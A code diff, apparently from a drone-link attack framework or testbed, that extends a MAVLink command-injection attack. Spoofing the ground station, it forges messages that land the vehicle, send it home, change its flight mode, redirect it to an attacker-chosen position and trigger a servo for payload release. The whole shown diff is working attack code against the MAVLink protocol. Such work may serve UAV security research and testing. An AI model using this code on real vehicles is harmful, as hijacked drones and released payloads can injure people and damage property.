@@ -70,15 +70,29 @@ class LinkAttack(Attacker):
 
 
 class CommandInjection(LinkAttack):
-    COMMANDS = {"land": MAV.MAV_CMD_NAV_LAND, "rtl": MAV.MAV_CMD_NAV_RETURN_TO_LAUNCH}
+    def message(self, kind: str):
+        if kind == "land":
+            return mav2.MAVLink_command_long_message(1, 1, MAV.MAV_CMD_NAV_LAND, 0, 0, 0, 0, 0, 0, 0, 0)
+        if kind == "rtl":
+            return mav2.MAVLink_command_long_message(1, 1, MAV.MAV_CMD_NAV_RETURN_TO_LAUNCH, 0, 0, 0, 0, 0, 0, 0, 0)
+        if kind == "set_mode":  # ArduCopter custom mode (default 5 = LOITER)
+            return mav2.MAVLink_set_mode_message(1, MAV.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, int(self.p.get("mode", 5)))
+        if kind == "position_target":  # redirect the vehicle to an attacker-chosen point
+            n, e, alt = self.p.get("target_ned", [80.0, 80.0, 20.0])
+            return mav2.MAVLink_set_position_target_local_ned_message(0, 1, 1, MAV.MAV_FRAME_LOCAL_NED, 0x0DF8,
+                                                                      n, e, -alt, 0, 0, 0, 0, 0, 0, 0, 0)
+        if kind == "set_servo":  # e.g. payload release
+            return mav2.MAVLink_command_long_message(1, 1, MAV.MAV_CMD_DO_SET_SERVO, 0,
+                                                     self.p.get("servo", 9), self.p.get("pwm", 1900), 0, 0, 0, 0, 0)
+        raise ValueError(kind)
 
     def tick(self, direction, now):
         if direction != UP or self.done or not self.active():
             return []
         self.done = True
-        cmd = self.COMMANDS[self.p.get("command", "land")]
-        self.action(command=self.p.get("command", "land"))
-        return [self.as_gcs(mav2.MAVLink_command_long_message(1, 1, cmd, 0, 0, 0, 0, 0, 0, 0, 0))]
+        kind = self.p.get("command", "land")
+        self.action(command=kind)
+        return [self.as_gcs(self.message(kind))]
 
 
 class TelemetryManipulation(LinkAttack):
